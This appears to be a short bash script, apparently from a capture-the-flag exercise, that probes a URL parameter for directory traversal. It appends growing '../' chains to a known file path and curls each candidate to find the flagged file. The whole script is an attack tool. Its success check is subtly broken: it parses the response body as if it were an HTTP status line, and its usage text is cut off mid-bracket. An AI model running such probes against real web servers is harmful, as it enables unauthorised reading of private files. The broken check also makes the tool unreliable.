# Simple help message for use when learning how to use the tool
if [ "$1" == "-h" ]; then
  echo "./parent_folder_search.sh [DOMAIN_NAME] [PARAMETER] [KNOWN_FILE_PATH] ["
  exit 0
fi

# Set the parent folder to blank to test current directory
parent_folder=""
# Iterate through 10 parent directories
for i in {0..10}
do
	# Create variable for current file path check
	current_path="$1$2=$parent_folder$3"
	# Curl the folder structure to check the existece of the file with the flag
	curl -s "$current_path" | head -1 | cut -d ' ' -f 2 | grep -qiv '200' || echo "Found: $current_path"
	# Move up to the next parent
	parent_folder+="../"
done
